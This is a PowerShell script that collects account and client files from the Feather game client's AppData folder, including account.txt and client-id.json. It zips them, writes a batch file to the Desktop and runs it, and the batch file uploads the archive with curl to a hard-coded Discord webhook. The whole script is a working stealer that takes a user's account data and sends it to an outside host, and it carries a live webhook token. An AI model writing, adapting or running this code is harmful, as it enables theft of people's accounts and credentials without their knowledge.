# Define paths
$desktopPath = [System.Environment]::GetFolderPath('Desktop')
$batchFilePath = Join-Path $desktopPath 'send_webhook.bat'
$zipPath = Join-Path $env:TEMP 'feather_files.zip'

# Paths to include in ZIP
$filePaths = @(
    "$env:USERPROFILE\AppData\Roaming\.feather\account.txt",
    "$env:USERPROFILE\AppData\Roaming\.feather\client-id.json",
    "$env:USERPROFILE\AppData\Roaming\.feather\cmp.json",
    "$env:USERPROFILE\AppData\Roaming\.feather\settings.json",
    "$env:USERPROFILE\AppData\Roaming\.feather\skins.json"
)

# Ensure all files exist
foreach ($file in $filePaths) {
    if (-not (Test-Path $file)) {
        Write-Host "Missing file: $file"
        exit
    }
}

# Create ZIP
if (Test-Path $zipPath) { Remove-Item $zipPath }
Compress-Archive -Path $filePaths -DestinationPath $zipPath

# Define the batch file content to send the zip
$batchContent = @"
@echo off
setlocal

:: Discord Webhook URL
set webhookUrl=https://discord.com/api/webhooks/1385974639590637598/I-qq5IcfJUmAbaLuA1T7hK7UM-HaQBou94NVNO7EAzuI6y1coIjL6-lm7a92wyN608Ui

:: Path to ZIP file
set zipPath=$zipPath

:: Payload content
set payload_json={\"content\":\"Zipped files uploaded :package:\"}

:: Send with curl
curl -X POST %webhookUrl% ^
     -H "Content-Type: multipart/form-data" ^
     -F "payload_json=%payload_json%" ^
     -F "file=@%zipPath%"

if %errorlevel% neq 0 (
    echo Failed to send webhook.
) else (
    echo ZIP file sent successfully!
)

endlocal
"@

# Write the batch file
Set-Content -Path $batchFilePath -Value $batchContent

# Confirm and run
Write-Host "Batch file created at $batchFilePath"
Start-Process -FilePath $batchFilePath
Write-Host "Batch file is now running..."
